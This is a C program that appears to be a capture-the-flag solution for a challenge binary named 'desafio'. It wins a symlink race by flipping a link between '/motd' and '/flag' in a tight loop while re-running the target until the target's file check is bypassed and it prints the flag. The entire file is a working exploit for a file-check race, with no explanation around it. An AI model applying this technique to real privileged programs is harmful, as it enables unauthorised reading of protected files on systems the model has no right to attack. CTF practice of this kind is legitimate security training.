#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>

void blink_files(void)
{
	while (1) {
		symlinkat("/motd", AT_FDCWD, "tmp");
		renameat(AT_FDCWD, "tmp", AT_FDCWD, "motd");
		symlinkat("/flag", AT_FDCWD, "tmp");
		renameat(AT_FDCWD, "tmp", AT_FDCWD, "motd");
	}
}

int main(void)
{
	int blink_pid = fork();
	switch(blink_pid) {
		case -1:
			return -1;
		case 0:
			blink_files();
		default:
	}

exec_desafio:

	int p_fd[2];
	pipe(p_fd);

	int desafio_pid = fork();
	switch(desafio_pid) {
		case -1:
			return -1;
		case 0:
			{
				close(1);
				dup2(p_fd[1], 1);
				char *argv[] = {"./desafio", NULL};
				char *env[] = {NULL};
				execve(argv[0], argv, env);
				return -1;
			}
		default:
	}

	waitpid(desafio_pid, NULL, 0);

	char output[4096];
	int output_sz = read(p_fd[0], output, 4096);
	output[output_sz] = '\x00';
	close(p_fd[0]);
	close(p_fd[1]);

	if (strstr(output, "Bem vindos ao Desafio") != NULL ||
			strstr(output, "This is the wrong file") != NULL ||
			strstr(output, "Error getting file stat") != NULL)
		goto exec_desafio;

	kill(blink_pid, SIGKILL);

	printf("Flag: \"%s\"\n", output);
}
